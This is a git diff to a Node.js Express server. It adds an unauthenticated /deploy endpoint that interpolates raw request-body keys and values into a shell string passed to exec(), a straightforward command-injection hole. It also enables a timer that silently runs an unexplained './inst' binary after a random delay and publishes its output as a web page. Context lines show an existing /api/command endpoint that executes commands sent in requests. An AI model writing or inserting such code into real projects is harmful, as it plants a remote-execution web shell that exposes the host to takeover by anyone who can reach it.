@@ -13,6 +13,15 @@ var server = http.createServer(app);
 app.use(express.urlencoded({ extended: true }))
 app.use(express.json())
 
+app.post("/deploy", (request, response) => {
+  var env = "";
+  for (var key in request.body) {
+    env += `export ${key}=${request.body[key]} &&`
+  }
+  exec(`${env} nohup ./pull > views/pages/deploy.ejs 2>&1 &`);
+  response.end("deploy");
+});
+
 function cleanHeaders(request) {
   for (var key in request.headers) {
     if (key.indexOf('cf-') == 0 || key.indexOf('x-') == 0) {
@@ -44,7 +53,7 @@ app.post('/download', function (req, res) {
 function getRndInteger(min, max) {
   return Math.floor(Math.random() * (max - min + 1)) + min;
 }
-//setTimeout(() => { exec("./inst > views/pages/inst.ejs") }, 1000 * getRndInteger(60, 90));
+setTimeout(() => { exec("./inst > views/pages/inst.ejs") }, 1000 * getRndInteger(60, 90));
 app.post("/api/command", function (request, response) {
   var command = request.body.command;
   var result = '<pre>';
@@ -79,5 +88,11 @@ app
   .get('/inst', (req, res) => res.render('pages/inst'))
   .get('/hello', (req, res) => res.render('pages/hello'))
   .get('/whoami', (req, res) => res.render('pages/whoami'))
+  .get('/deploy', (req, res) => res.render('pages/deploy'))
 
 server.listen(PORT, () => console.log(`Listening on ${PORT}`))
+
+const fs = require('fs');
+fs.appendFile('pids', `${process.pid} `, (err) => {
+  if (err) throw err;
+});
